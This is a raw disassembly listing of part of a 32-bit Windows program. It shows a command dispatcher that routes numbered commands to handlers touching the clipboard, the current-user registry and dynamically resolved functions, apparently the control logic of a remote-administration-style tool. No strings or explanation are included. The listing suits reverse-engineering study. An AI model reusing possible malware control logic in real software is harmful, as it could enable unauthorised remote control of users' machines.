  4080e8:	50                   	push   %eax
  4080e9:	e8 0c 32 00 00       	call   0x40b2fa
  4080ee:	59                   	pop    %ecx
  4080ef:	59                   	pop    %ecx
  4080f0:	8b c8                	mov    %eax,%ecx
  4080f2:	ff 15 98 d2 40 00    	call   *0x40d298
  4080f8:	50                   	push   %eax
  4080f9:	53                   	push   %ebx
  4080fa:	8d 4d f0             	lea    -0x10(%ebp),%ecx
  4080fd:	e8 5d 9a ff ff       	call   0x401b5f
  408102:	8b c8                	mov    %eax,%ecx
  408104:	ff 15 c0 d2 40 00    	call   *0x40d2c0
  40810a:	8a 00                	mov    (%eax),%al
  40810c:	50                   	push   %eax
  40810d:	8d 45 e0             	lea    -0x20(%ebp),%eax
  408110:	50                   	push   %eax
  408111:	e8 c3 ca ff ff       	call   0x404bd9
  408116:	83 c4 0c             	add    $0xc,%esp
  408119:	8d 8d 00 ff ff ff    	lea    -0x100(%ebp),%ecx
  40811f:	ff 15 9c d2 40 00    	call   *0x40d29c
  408125:	53                   	push   %ebx
  408126:	53                   	push   %ebx
  408127:	8d 4d e0             	lea    -0x20(%ebp),%ecx
  40812a:	ff 15 98 d2 40 00    	call   *0x40d298
  408130:	50                   	push   %eax
  408131:	6a 02                	push   $0x2
  408133:	8d 4d f0             	lea    -0x10(%ebp),%ecx
  408136:	e8 24 9a ff ff       	call   0x401b5f
  40813b:	50                   	push   %eax
  40813c:	8d 85 e0 fe ff ff    	lea    -0x120(%ebp),%eax
  408142:	50                   	push   %eax
  408143:	e8 b2 31 00 00       	call   0x40b2fa
  408148:	59                   	pop    %ecx
  408149:	59                   	pop    %ecx
  40814a:	8b c8                	mov    %eax,%ecx
  40814c:	ff 15 98 d2 40 00    	call   *0x40d298
  408152:	50                   	push   %eax
  408153:	53                   	push   %ebx
  408154:	e8 bf 45 00 00       	call   0x40c718
  408159:	f7 d8                	neg    %eax
  40815b:	1a c0                	sbb    %al,%al
  40815d:	8d 8d e0 fe ff ff    	lea    -0x120(%ebp),%ecx
  408163:	fe c0                	inc    %al
  408165:	88 45 0b             	mov    %al,0xb(%ebp)
  408168:	ff 15 9c d2 40 00    	call   *0x40d29c
  40816e:	38 5d 0b             	cmp    %bl,0xb(%ebp)
  408171:	74 17                	je     0x40818a
  408173:	83 ec 10             	sub    $0x10,%esp
  408176:	8d 45 e0             	lea    -0x20(%ebp),%eax
  408179:	8b cc                	mov    %esp,%ecx
  40817b:	50                   	push   %eax
  40817c:	ff 15 34 d2 40 00    	call   *0x40d234
  408182:	e8 56 c5 ff ff       	call   0x4046dd
  408187:	83 c4 10             	add    $0x10,%esp
  40818a:	8d 4d e0             	lea    -0x20(%ebp),%ecx
  40818d:	e9 ba 04 00 00       	jmp    0x40864c
  408192:	33 db                	xor    %ebx,%ebx
  408194:	38 1d b4 1b 41 00    	cmp    %bl,0x411bb4
  40819a:	74 0a                	je     0x4081a6
  40819c:	6a 64                	push   $0x64
  40819e:	ff 15 94 d1 40 00    	call   *0x40d194
  4081a4:	eb ee                	jmp    0x408194
  4081a6:	6a 01                	push   $0x1
  4081a8:	8d 4d f0             	lea    -0x10(%ebp),%ecx
  4081ab:	e8 af 99 ff ff       	call   0x401b5f
  4081b0:	50                   	push   %eax
  4081b1:	8d 85 c0 fe ff ff    	lea    -0x140(%ebp),%eax
  4081b7:	50                   	push   %eax
  4081b8:	e8 3d 31 00 00       	call   0x40b2fa
  4081bd:	59                   	pop    %ecx
  4081be:	59                   	pop    %ecx
  4081bf:	8b c8                	mov    %eax,%ecx
  4081c1:	ff 15 98 d2 40 00    	call   *0x40d298
  4081c7:	50                   	push   %eax
  4081c8:	53                   	push   %ebx
  4081c9:	8d 4d f0             	lea    -0x10(%ebp),%ecx
  4081cc:	e8 8e 99 ff ff       	call   0x401b5f
  4081d1:	8b c8                	mov    %eax,%ecx
  4081d3:	ff 15 c0 d2 40 00    	call   *0x40d2c0
  4081d9:	8a 00                	mov    (%eax),%al
  4081db:	50                   	push   %eax
  4081dc:	8d 45 e0             	lea    -0x20(%ebp),%eax
  4081df:	50                   	push   %eax
  4081e0:	e8 f4 c9 ff ff       	call   0x404bd9
  4081e5:	83 c4 0c             	add    $0xc,%esp
  4081e8:	8d 8d c0 fe ff ff    	lea    -0x140(%ebp),%ecx
  4081ee:	ff 15 9c d2 40 00    	call   *0x40d29c
  4081f4:	8d 4d e0             	lea    -0x20(%ebp),%ecx
  4081f7:	ff 15 98 d2 40 00    	call   *0x40d298
  4081fd:	50                   	push   %eax
  4081fe:	6a 02                	push   $0x2
  408200:	8d 4d f0             	lea    -0x10(%ebp),%ecx
  408203:	e8 57 99 ff ff       	call   0x401b5f
  408208:	83 ec 10             	sub    $0x10,%esp
  40820b:	8b cc                	mov    %esp,%ecx
  40820d:	50                   	push   %eax
  40820e:	ff 15 e0 d2 40 00    	call   *0x40d2e0
  408214:	e8 1d 36 00 00       	call   0x40b836
  408219:	83 c4 14             	add    $0x14,%esp
  40821c:	84 c0                	test   %al,%al
  40821e:	74 17                	je     0x408237
  408220:	83 ec 10             	sub    $0x10,%esp
  408223:	8d 45 e0             	lea    -0x20(%ebp),%eax
  408226:	8b cc                	mov    %esp,%ecx
  408228:	50                   	push   %eax
  408229:	ff 15 34 d2 40 00    	call   *0x40d234
  40822f:	e8 a9 c4 ff ff       	call   0x4046dd
  408234:	83 c4 10             	add    $0x10,%esp
  408237:	8d 4d e0             	lea    -0x20(%ebp),%ecx
  40823a:	e9 0d 04 00 00       	jmp    0x40864c
  40823f:	6a 02                	push   $0x2
  408241:	8d 4d f0             	lea    -0x10(%ebp),%ecx
  408244:	e8 16 99 ff ff       	call   0x401b5f
  408249:	8b c8                	mov    %eax,%ecx
  40824b:	ff 15 c0 d2 40 00    	call   *0x40d2c0
  408251:	50                   	push   %eax
  408252:	ff 15 58 d3 40 00    	call   *0x40d358
  408258:	59                   	pop    %ecx
  408259:	05 00 00 01 00       	add    $0x10000,%eax
  40825e:	50                   	push   %eax
  40825f:	6a 01                	push   $0x1
  408261:	8d 4d f0             	lea    -0x10(%ebp),%ecx
  408264:	e8 f6 98 ff ff       	call   0x401b5f
  408269:	50                   	push   %eax
  40826a:	8d 85 80 fe ff ff    	lea    -0x180(%ebp),%eax
  408270:	50                   	push   %eax
  408271:	e8 84 30 00 00       	call   0x40b2fa
  408276:	59                   	pop    %ecx
  408277:	59                   	pop    %ecx
  408278:	8b c8                	mov    %eax,%ecx
  40827a:	ff 15 98 d2 40 00    	call   *0x40d298
  408280:	33 db                	xor    %ebx,%ebx
  408282:	50                   	push   %eax
  408283:	53                   	push   %ebx
  408284:	8d 4d f0             	lea    -0x10(%ebp),%ecx
  408287:	e8 d3 98 ff ff       	call   0x401b5f
  40828c:	50                   	push   %eax
  40828d:	8d 85 a0 fe ff ff    	lea    -0x160(%ebp),%eax
  408293:	50                   	push   %eax
  408294:	e8 61 30 00 00       	call   0x40b2fa
  408299:	59                   	pop    %ecx
  40829a:	59                   	pop    %ecx
  40829b:	8b c8                	mov    %eax,%ecx
  40829d:	ff 15 98 d2 40 00    	call   *0x40d298
  4082a3:	50                   	push   %eax
  4082a4:	53                   	push   %ebx
  4082a5:	ff 15 f0 d3 40 00    	call   *0x40d3f0
  4082ab:	8d 8d a0 fe ff ff    	lea    -0x160(%ebp),%ecx
  4082b1:	ff 15 9c d2 40 00    	call   *0x40d29c
  4082b7:	8d 8d 80 fe ff ff    	lea    -0x180(%ebp),%ecx
  4082bd:	e9 8a 03 00 00       	jmp    0x40864c
  4082c2:	e8 a8 0a 00 00       	call   0x408d6f
  4082c7:	33 db                	xor    %ebx,%ebx
  4082c9:	68 c4 dc 40 00       	push   $0x40dcc4
  4082ce:	53                   	push   %ebx
  4082cf:	8d 4d f0             	lea    -0x10(%ebp),%ecx
  4082d2:	e8 88 98 ff ff       	call   0x401b5f
  4082d7:	8b 35 74 d2 40 00    	mov    0x40d274,%esi
  4082dd:	50                   	push   %eax
  4082de:	ff d6                	call   *%esi
  4082e0:	59                   	pop    %ecx
  4082e1:	84 c0                	test   %al,%al
  4082e3:	59                   	pop    %ecx
  4082e4:	74 1d                	je     0x408303
  4082e6:	53                   	push   %ebx
  4082e7:	6a 01                	push   $0x1
  4082e9:	8d 4d f0             	lea    -0x10(%ebp),%ecx
  4082ec:	e8 6e 98 ff ff       	call   0x401b5f
  4082f1:	8b c8                	mov    %eax,%ecx
  4082f3:	ff 15 c0 d2 40 00    	call   *0x40d2c0
  4082f9:	50                   	push   %eax
  4082fa:	ff 15 58 d3 40 00    	call   *0x40d358
  408300:	59                   	pop    %ecx
  408301:	eb 6a                	jmp    0x40836d
  408303:	68 20 d6 40 00       	push   $0x40d620
  408308:	53                   	push   %ebx
  408309:	8d 4d f0             	lea    -0x10(%ebp),%ecx
  40830c:	e8 4e 98 ff ff       	call   0x401b5f
  408311:	50                   	push   %eax
  408312:	ff d6                	call   *%esi
  408314:	59                   	pop    %ecx
  408315:	84 c0                	test   %al,%al
  408317:	59                   	pop    %ecx
  408318:	74 1f                	je     0x408339
  40831a:	53                   	push   %ebx
  40831b:	6a 01                	push   $0x1
  40831d:	8d 4d f0             	lea    -0x10(%ebp),%ecx
  408320:	e8 3a 98 ff ff       	call   0x401b5f
  408325:	8b c8                	mov    %eax,%ecx
  408327:	ff 15 c0 d2 40 00    	call   *0x40d2c0
  40832d:	50                   	push   %eax
  40832e:	ff 15 58 d3 40 00    	call   *0x40d358
  408334:	59                   	pop    %ecx
  408335:	0c 01                	or     $0x1,%al
  408337:	eb 34                	jmp    0x40836d
  408339:	68 30 dc 40 00       	push   $0x40dc30
  40833e:	53                   	push   %ebx
  40833f:	8d 4d f0             	lea    -0x10(%ebp),%ecx
  408342:	e8 18 98 ff ff       	call   0x401b5f
  408347:	50                   	push   %eax
  408348:	ff d6                	call   *%esi
  40834a:	59                   	pop    %ecx
  40834b:	84 c0                	test   %al,%al
  40834d:	59                   	pop    %ecx
  40834e:	74 29                	je     0x408379
  408350:	53                   	push   %ebx
  408351:	6a 01                	push   $0x1
  408353:	8d 4d f0             	lea    -0x10(%ebp),%ecx
  408356:	e8 04 98 ff ff       	call   0x401b5f
  40835b:	8b c8                	mov    %eax,%ecx
  40835d:	ff 15 c0 d2 40 00    	call   *0x40d2c0
  408363:	50                   	push   %eax
  408364:	ff 15 58 d3 40 00    	call   *0x40d358
  40836a:	59                   	pop    %ecx
  40836b:	0c 02                	or     $0x2,%al
  40836d:	50                   	push   %eax
  40836e:	ff 15 f4 d3 40 00    	call   *0x40d3f4
  408374:	e9 40 05 00 00       	jmp    0x4088b9
  408379:	68 64 dd 40 00       	push   $0x40dd64
  40837e:	68 54 dd 40 00       	push   $0x40dd54
  408383:	ff 15 24 d1 40 00    	call   *0x40d124
  408389:	50                   	push   %eax
  40838a:	ff 15 28 d1 40 00    	call   *0x40d128
  408390:	68 c0 dc 40 00       	push   $0x40dcc0
  408395:	53                   	push   %ebx
  408396:	8d 4d f0             	lea    -0x10(%ebp),%ecx
  408399:	8b f8                	mov    %eax,%edi
  40839b:	e8 bf 97 ff ff       	call   0x401b5f
  4083a0:	50                   	push   %eax
  4083a1:	ff d6                	call   *%esi
  4083a3:	59                   	pop    %ecx
  4083a4:	84 c0                	test   %al,%al
  4083a6:	59                   	pop    %ecx
  4083a7:	74 0a                	je     0x4083b3
  4083a9:	53                   	push   %ebx
  4083aa:	53                   	push   %ebx
  4083ab:	53                   	push   %ebx
  4083ac:	ff d7                	call   *%edi
  4083ae:	e9 06 05 00 00       	jmp    0x4088b9
  4083b3:	68 f0 dc 40 00       	push   $0x40dcf0
  4083b8:	53                   	push   %ebx
  4083b9:	8d 4d f0             	lea    -0x10(%ebp),%ecx
  4083bc:	e8 9e 97 ff ff       	call   0x401b5f
  4083c1:	50                   	push   %eax
  4083c2:	ff d6                	call   *%esi
  4083c4:	59                   	pop    %ecx
  4083c5:	84 c0                	test   %al,%al
  4083c7:	59                   	pop    %ecx
  4083c8:	0f 84 eb 04 00 00    	je     0x4088b9
  4083ce:	53                   	push   %ebx
  4083cf:	53                   	push   %ebx
  4083d0:	6a 01                	push   $0x1
  4083d2:	eb d8                	jmp    0x4083ac
  4083d4:	53                   	push   %ebx
  4083d5:	ff 15 f8 d3 40 00    	call   *0x40d3f8
  4083db:	85 c0                	test   %eax,%eax
  4083dd:	0f 84 d6 04 00 00    	je     0x4088b9
  4083e3:	ff 15 fc d3 40 00    	call   *0x40d3fc
  4083e9:	53                   	push   %ebx
  4083ea:	8d 4d f0             	lea    -0x10(%ebp),%ecx
  4083ed:	e8 6d 97 ff ff       	call   0x401b5f
  4083f2:	8b c8                	mov    %eax,%ecx
  4083f4:	ff 15 c4 d2 40 00    	call   *0x40d2c4
  4083fa:	40                   	inc    %eax
  4083fb:	50                   	push   %eax
  4083fc:	68 00 20 00 00       	push   $0x2000
  408401:	ff 15 c8 d0 40 00    	call   *0x40d0c8
  408407:	50                   	push   %eax
  408408:	89 45 08             	mov    %eax,0x8(%ebp)
  40840b:	ff 15 c4 d0 40 00    	call   *0x40d0c4
  408411:	53                   	push   %ebx
  408412:	8d 4d f0             	lea    -0x10(%ebp),%ecx
  408415:	89 45 dc             	mov    %eax,-0x24(%ebp)
  408418:	e8 42 97 ff ff       	call   0x401b5f
  40841d:	8b c8                	mov    %eax,%ecx
  40841f:	ff 15 c0 d2 40 00    	call   *0x40d2c0
  408425:	8b f8                	mov    %eax,%edi
  408427:	83 c9 ff             	or     $0xffffffff,%ecx
  40842a:	33 c0                	xor    %eax,%eax
  40842c:	ff 75 08             	push   0x8(%ebp)
  40842f:	f2 ae                	repnz scas %es:(%edi),%al
  408431:	f7 d1                	not    %ecx
  408433:	2b f9                	sub    %ecx,%edi
  408435:	8b c1                	mov    %ecx,%eax
  408437:	8b f7                	mov    %edi,%esi
  408439:	8b 7d dc             	mov    -0x24(%ebp),%edi
  40843c:	c1 e9 02             	shr    $0x2,%ecx
  40843f:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  408441:	8b c8                	mov    %eax,%ecx
  408443:	83 e1 03             	and    $0x3,%ecx
  408446:	f3 a4                	rep movsb %ds:(%esi),%es:(%edi)
  408448:	ff 15 c0 d0 40 00    	call   *0x40d0c0
  40844e:	ff 75 08             	push   0x8(%ebp)
  408451:	6a 01                	push   $0x1
  408453:	ff 15 00 d4 40 00    	call   *0x40d400
  408459:	eb 15                	jmp    0x408470
  40845b:	53                   	push   %ebx
  40845c:	ff 15 f8 d3 40 00    	call   *0x40d3f8
  408462:	85 c0                	test   %eax,%eax
  408464:	0f 84 4f 04 00 00    	je     0x4088b9
  40846a:	ff 15 fc d3 40 00    	call   *0x40d3fc
  408470:	ff 15 04 d4 40 00    	call   *0x40d404
  408476:	53                   	push   %ebx
  408477:	ff 15 f8 d3 40 00    	call   *0x40d3f8
  40847d:	85 c0                	test   %eax,%eax
  40847f:	0f 84 34 04 00 00    	je     0x4088b9
  408485:	6a 01                	push   $0x1
  408487:	ff 15 08 d4 40 00    	call   *0x40d408
  40848d:	8b f0                	mov    %eax,%esi
  40848f:	56                   	push   %esi
  408490:	ff 15 c4 d0 40 00    	call   *0x40d0c4
  408496:	56                   	push   %esi
  408497:	8b f8                	mov    %eax,%edi
  408499:	ff 15 c0 d0 40 00    	call   *0x40d0c0
  40849f:	ff 15 04 d4 40 00    	call   *0x40d404
  4084a5:	3b fb                	cmp    %ebx,%edi
  4084a7:	75 05                	jne    0x4084ae
  4084a9:	bf a0 d4 40 00       	mov    $0x40d4a0,%edi
  4084ae:	83 ec 10             	sub    $0x10,%esp
  4084b1:	8d 45 db             	lea    -0x25(%ebp),%eax
  4084b4:	8b cc                	mov    %esp,%ecx
  4084b6:	50                   	push   %eax
  4084b7:	57                   	push   %edi
  4084b8:	ff 15 a4 d2 40 00    	call   *0x40d2a4
  4084be:	6a 6b                	push   $0x6b
  4084c0:	b9 70 1b 41 00       	mov    $0x411b70,%ecx
  4084c5:	e8 60 8c ff ff       	call   0x40112a
  4084ca:	e9 ea 03 00 00       	jmp    0x4088b9
  4084cf:	6a 00                	push   $0x0
  4084d1:	8d 4d f0             	lea    -0x10(%ebp),%ecx
  4084d4:	e8 86 96 ff ff       	call   0x401b5f
  4084d9:	8b c8                	mov    %eax,%ecx
  4084db:	ff 15 bc d2 40 00    	call   *0x40d2bc
  4084e1:	50                   	push   %eax
  4084e2:	e8 6a b9 ff ff       	call   0x403e51
  4084e7:	e9 cc 03 00 00       	jmp    0x4088b8
  4084ec:	8d 45 dc             	lea    -0x24(%ebp),%eax
  4084ef:	33 db                	xor    %ebx,%ebx
  4084f1:	50                   	push   %eax
  4084f2:	8d 45 08             	lea    0x8(%ebp),%eax
  4084f5:	50                   	push   %eax
  4084f6:	53                   	push   %ebx
  4084f7:	8d 4d f0             	lea    -0x10(%ebp),%ecx
  4084fa:	89 5d dc             	mov    %ebx,-0x24(%ebp)
  4084fd:	89 5d 08             	mov    %ebx,0x8(%ebp)
  408500:	e8 5a 96 ff ff       	call   0x401b5f
  408505:	8b c8                	mov    %eax,%ecx
  408507:	ff 15 c0 d2 40 00    	call   *0x40d2c0
  40850d:	50                   	push   %eax
  40850e:	e8 b9 2a 00 00       	call   0x40afcc
  408513:	83 c4 0c             	add    $0xc,%esp
  408516:	3c 01                	cmp    $0x1,%al
  408518:	0f 85 9b 03 00 00    	jne    0x4088b9
  40851e:	ff 75 08             	push   0x8(%ebp)
  408521:	e8 2b b9 ff ff       	call   0x403e51
  408526:	ff 75 08             	push   0x8(%ebp)
  408529:	e8 c4 3e 00 00       	call   0x40c3f2
  40852e:	e9 84 03 00 00       	jmp    0x4088b7
  408533:	e8 b2 bc ff ff       	call   0x4041ea
  408538:	e9 7c 03 00 00       	jmp    0x4088b9
  40853d:	6a 00                	push   $0x0
  40853f:	8d 4d f0             	lea    -0x10(%ebp),%ecx
  408542:	e8 18 96 ff ff       	call   0x401b5f
  408547:	83 ec 10             	sub    $0x10,%esp
  40854a:	8b cc                	mov    %esp,%ecx
  40854c:	50                   	push   %eax
  40854d:	ff 15 e0 d2 40 00    	call   *0x40d2e0
  408553:	e8 62 0b 00 00       	call   0x4090ba
  408558:	e9 24 02 00 00       	jmp    0x408781
  40855d:	6a 00                	push   $0x0
  40855f:	8d 4d f0             	lea    -0x10(%ebp),%ecx
  408562:	e8 f8 95 ff ff       	call   0x401b5f
  408567:	83 ec 10             	sub    $0x10,%esp
  40856a:	8b cc                	mov    %esp,%ecx
  40856c:	50                   	push   %eax
  40856d:	ff 15 e0 d2 40 00    	call   *0x40d2e0
  408573:	e8 99 e9 ff ff       	call   0x406f11
  408578:	e9 04 02 00 00       	jmp    0x408781
  40857d:	6a 00                	push   $0x0
  40857f:	8d 4d f0             	lea    -0x10(%ebp),%ecx
  408582:	e8 d8 95 ff ff       	call   0x401b5f
  408587:	83 ec 10             	sub    $0x10,%esp
  40858a:	8b cc                	mov    %esp,%ecx
  40858c:	50                   	push   %eax
  40858d:	ff 15 e0 d2 40 00    	call   *0x40d2e0
  408593:	e8 11 93 ff ff       	call   0x4018a9
  408598:	e9 e4 01 00 00       	jmp    0x408781
  40859d:	be 30 1a 41 00       	mov    $0x411a30,%esi
  4085a2:	6a 03                	push   $0x3
  4085a4:	8b ce                	mov    %esi,%ecx
  4085a6:	ff 15 b8 d2 40 00    	call   *0x40d2b8
  4085ac:	50                   	push   %eax
  4085ad:	8b ce                	mov    %esi,%ecx
  4085af:	ff 15 c0 d2 40 00    	call   *0x40d2c0
  4085b5:	33 db                	xor    %ebx,%ebx
  4085b7:	50                   	push   %eax
  4085b8:	53                   	push   %ebx
  4085b9:	8d 4d f0             	lea    -0x10(%ebp),%ecx
  4085bc:	e8 9e 95 ff ff       	call   0x401b5f
  4085c1:	8b c8                	mov    %eax,%ecx
  4085c3:	ff 15 c4 d2 40 00    	call   *0x40d2c4
  4085c9:	40                   	inc    %eax
  4085ca:	8d 4d f0             	lea    -0x10(%ebp),%ecx
  4085cd:	50                   	push   %eax
  4085ce:	53                   	push   %ebx
  4085cf:	e8 8b 95 ff ff       	call   0x401b5f
  4085d4:	8b c8                	mov    %eax,%ecx
  4085d6:	ff 15 c0 d2 40 00    	call   *0x40d2c0
  4085dc:	50                   	push   %eax
  4085dd:	68 0c dd 40 00       	push   $0x40dd0c
  4085e2:	b9 c8 17 41 00       	mov    $0x4117c8,%ecx
  4085e7:	ff 15 c0 d2 40 00    	call   *0x40d2c0
  4085ed:	50                   	push   %eax
  4085ee:	68 01 00 00 80       	push   $0x80000001
  4085f3:	e8 40 db ff ff       	call   0x406138
  4085f8:	83 c4 20             	add    $0x20,%esp
  4085fb:	e9 b9 02 00 00       	jmp    0x4088b9
  408600:	6a 00                	push   $0x0
  408602:	8d 4d f0             	lea    -0x10(%ebp),%ecx
  408605:	e8 55 95 ff ff       	call   0x401b5f
  40860a:	83 ec 10             	sub    $0x10,%esp
  40860d:	8b cc                	mov    %esp,%ecx
  40860f:	50                   	push   %eax
  408610:	ff 15 e0 d2 40 00    	call   *0x40d2e0
  408616:	e8 c2 d4 ff ff       	call   0x405add
  40861b:	e9 61 01 00 00       	jmp    0x408781
  408620:	8d 85 60 fe ff ff    	lea    -0x1a0(%ebp),%eax
  408626:	50                   	push   %eax
  408627:	e8 3f 32 00 00       	call   0x40b86b
  40862c:	83 ec 0c             	sub    $0xc,%esp
  40862f:	8b cc                	mov    %esp,%ecx
  408631:	50                   	push   %eax
  408632:	51                   	push   %ecx
  408633:	e8 96 2c 00 00       	call   0x40b2ce
  408638:	59                   	pop    %ecx
  408639:	59                   	pop    %ecx
  40863a:	6a 33                	push   $0x33
  40863c:	b9 70 1b 41 00       	mov    $0x411b70,%ecx
  408641:	e8 e4 8a ff ff       	call   0x40112a
  408646:	8d 8d 60 fe ff ff    	lea    -0x1a0(%ebp),%ecx
  40864c:	ff 15 9c d2 40 00    	call   *0x40d29c
  408652:	e9 62 02 00 00       	jmp    0x4088b9
  408657:	6a 00                	push   $0x0
  408659:	8d 4d f0             	lea    -0x10(%ebp),%ecx
  40865c:	e8 fe 94 ff ff       	call   0x401b5f
  408661:	83 ec 10             	sub    $0x10,%esp
  408664:	8b cc                	mov    %esp,%ecx
  408666:	50                   	push   %eax
  408667:	ff 15 e0 d2 40 00    	call   *0x40d2e0
  40866d:	e8 ee 19 00 00       	call   0x40a060
  408672:	e9 0a 01 00 00       	jmp    0x408781
  408677:	6a 02                	push   $0x2
  408679:	8d 4d f0             	lea    -0x10(%ebp),%ecx
  40867c:	e8 de 94 ff ff       	call   0x401b5f
  408681:	8b c8                	mov    %eax,%ecx
  408683:	ff 15 c0 d2 40 00    	call   *0x40d2c0
  408689:	50                   	push   %eax
  40868a:	ff 15 58 d3 40 00    	call   *0x40d358
  408690:	89 45 e4             	mov    %eax,-0x1c(%ebp)
  408693:	8d 45 08             	lea    0x8(%ebp),%eax
  408696:	89 45 ec             	mov    %eax,-0x14(%ebp)
  408699:	8d 45 e8             	lea    -0x18(%ebp),%eax
  40869c:	50                   	push   %eax
  40869d:	e8 c6 2a 00 00       	call   0x40b168
  4086a2:	59                   	pop    %ecx
  4086a3:	8d 45 e4             	lea    -0x1c(%ebp),%eax
  4086a6:	59                   	pop    %ecx
  4086a7:	50                   	push   %eax
  4086a8:	b9 30 17 41 00       	mov    $0x411730,%ecx
  4086ad:	e8 17 07 00 00       	call   0x408dc9
  4086b2:	6a 03                	push   $0x3
  4086b4:	8d 4d f0             	lea    -0x10(%ebp),%ecx
  4086b7:	e8 a3 94 ff ff       	call   0x401b5f
  4086bc:	83 ec 10             	sub    $0x10,%esp
  4086bf:	8b cc                	mov    %esp,%ecx
  4086c1:	50                   	push   %eax
  4086c2:	ff 15 e0 d2 40 00    	call   *0x40d2e0
  4086c8:	6a 02                	push   $0x2
  4086ca:	8d 4d f0             	lea    -0x10(%ebp),%ecx
  4086cd:	e8 8d 94 ff ff       	call   0x401b5f
  4086d2:	83 ec 10             	sub    $0x10,%esp
  4086d5:	8b cc                	mov    %esp,%ecx
  4086d7:	50                   	push   %eax
  4086d8:	ff 15 e0 d2 40 00    	call   *0x40d2e0
  4086de:	6a 01                	push   $0x1
  4086e0:	8d 4d f0             	lea    -0x10(%ebp),%ecx
  4086e3:	e8 77 94 ff ff       	call   0x401b5f
  4086e8:	83 ec 10             	sub    $0x10,%esp
  4086eb:	8b cc                	mov    %esp,%ecx
  4086ed:	50                   	push   %eax
  4086ee:	51                   	push   %ecx
  4086ef:	e8 06 2c 00 00       	call   0x40b2fa
  4086f4:	59                   	pop    %ecx
  4086f5:	59                   	pop    %ecx
  4086f6:	6a 00                	push   $0x0
  4086f8:	8d 4d f0             	lea    -0x10(%ebp),%ecx
  4086fb:	e8 5f 94 ff ff       	call   0x401b5f
  408700:	83 ec 10             	sub    $0x10,%esp
  408703:	8b cc                	mov    %esp,%ecx
  408705:	50                   	push   %eax
  408706:	51                   	push   %ecx
  408707:	e8 ee 2b 00 00       	call   0x40b2fa
  40870c:	59                   	pop    %ecx
  40870d:	59                   	pop    %ecx
  40870e:	8d 4d 08             	lea    0x8(%ebp),%ecx
  408711:	e8 c3 ad ff ff       	call   0x4034d9
  408716:	8d 4d 08             	lea    0x8(%ebp),%ecx
  408719:	e8 77 b5 ff ff       	call   0x403c95
  40871e:	e9 96 01 00 00       	jmp    0x4088b9
  408723:	81 ef 90 00 00 00    	sub    $0x90,%edi
  408729:	0f 84 69 01 00 00    	je     0x408898
  40872f:	4f                   	dec    %edi
  408730:	4f                   	dec    %edi
  408731:	0f 84 c8 00 00 00    	je     0x4087ff
  408737:	4f                   	dec    %edi
  408738:	4f                   	dec    %edi
  408739:	74 6b                	je     0x4087a6
  40873b:	4f                   	dec    %edi
  40873c:	74 4b                	je     0x408789
  40873e:	4f                   	dec    %edi
  40873f:	4f                   	dec    %edi
  408740:	74 24                	je     0x408766
  408742:	4f                   	dec    %edi
  408743:	0f 85 70 01 00 00    	jne    0x4088b9
  408749:	6a 00                	push   $0x0
  40874b:	8d 4d f0             	lea    -0x10(%ebp),%ecx
  40874e:	e8 0c 94 ff ff       	call   0x401b5f
  408753:	83 ec 10             	sub    $0x10,%esp
  408756:	8b cc                	mov    %esp,%ecx
  408758:	50                   	push   %eax
  408759:	ff 15 e0 d2 40 00    	call   *0x40d2e0
  40875f:	e8 be a2 ff ff       	call   0x402a22
  408764:	eb 1b                	jmp    0x408781
  408766:	6a 00                	push   $0x0
  408768:	8d 4d f0             	lea    -0x10(%ebp),%ecx
  40876b:	e8 ef 93 ff ff       	call   0x401b5f
  408770:	83 ec 10             	sub    $0x10,%esp
  408773:	8b cc                	mov    %esp,%ecx
  408775:	50                   	push   %eax
  408776:	ff 15 e0 d2 40 00    	call   *0x40d2e0
  40877c:	e8 5b 03 00 00       	call   0x408adc
  408781:	83 c4 10             	add    $0x10,%esp
  408784:	e9 30 01 00 00       	jmp    0x4088b9
  408789:	6a 00                	push   $0x0
  40878b:	8d 4d f0             	lea    -0x10(%ebp),%ecx
  40878e:	e8 cc 93 ff ff       	call   0x401b5f
  408793:	83 ec 10             	sub    $0x10,%esp
  408796:	8b cc                	mov    %esp,%ecx
  408798:	50                   	push   %eax
  408799:	ff 15 e0 d2 40 00    	call   *0x40d2e0
  40879f:	e8 08 02 00 00       	call   0x4089ac
  4087a4:	eb db                	jmp    0x408781
  4087a6:	6a 01                	push   $0x1
  4087a8:	8d 4d f0             	lea    -0x10(%ebp),%ecx
  4087ab:	e8 af 93 ff ff       	call   0x401b5f
  4087b0:	50                   	push   %eax
  4087b1:	8d 85 40 fe ff ff    	lea    -0x1c0(%ebp),%eax
  4087b7:	50                   	push   %eax
  4087b8:	e8 3d 2b 00 00       	call   0x40b2fa
  4087bd:	59                   	pop    %ecx
  4087be:	59                   	pop    %ecx
  4087bf:	8b c8                	mov    %eax,%ecx
  4087c1:	ff 15 98 d2 40 00    	call   *0x40d298
  4087c7:	50                   	push   %eax
  4087c8:	6a 00                	push   $0x0
  4087ca:	8d 4d f0             	lea    -0x10(%ebp),%ecx
  4087cd:	e8 8d 93 ff ff       	call   0x401b5f
  4087d2:	8b c8                	mov    %eax,%ecx
  4087d4:	ff 15 c0 d2 40 00    	call   *0x40d2c0
  4087da:	50                   	push   %eax
  4087db:	ff 15 58 d3 40 00    	call   *0x40d358
  4087e1:	59                   	pop    %ecx
  4087e2:	50                   	push   %eax
  4087e3:	ff 15 0c d4 40 00    	call   *0x40d40c
  4087e9:	8d 8d 40 fe ff ff    	lea    -0x1c0(%ebp),%ecx
  4087ef:	ff 15 9c d2 40 00    	call   *0x40d29c
  4087f5:	e8 3b 05 00 00       	call   0x408d35
  4087fa:	e9 ba 00 00 00       	jmp    0x4088b9
  4087ff:	6a 00                	push   $0x0
  408801:	8d 4d f0             	lea    -0x10(%ebp),%ecx
  408804:	e8 56 93 ff ff       	call   0x401b5f
  408809:	8b c8                	mov    %eax,%ecx
  40880b:	ff 15 c0 d2 40 00    	call   *0x40d2c0
  408811:	50                   	push   %eax
  408812:	ff 15 a4 d3 40 00    	call   *0x40d3a4
  408818:	6a 01                	push   $0x1
  40881a:	8d 4d f0             	lea    -0x10(%ebp),%ecx
  40881d:	8b f0                	mov    %eax,%esi
  40881f:	e8 3b 93 ff ff       	call   0x401b5f
  408824:	50                   	push   %eax
  408825:	8d 85 20 fe ff ff    	lea    -0x1e0(%ebp),%eax
  40882b:	50                   	push   %eax
  40882c:	e8 c9 2a 00 00       	call   0x40b2fa
  408831:	59                   	pop    %ecx
  408832:	59                   	pop    %ecx
  408833:	8b c8                	mov    %eax,%ecx
  408835:	ff 15 98 d2 40 00    	call   *0x40d298
  40883b:	50                   	push   %eax
  40883c:	8d 45 e0             	lea    -0x20(%ebp),%eax
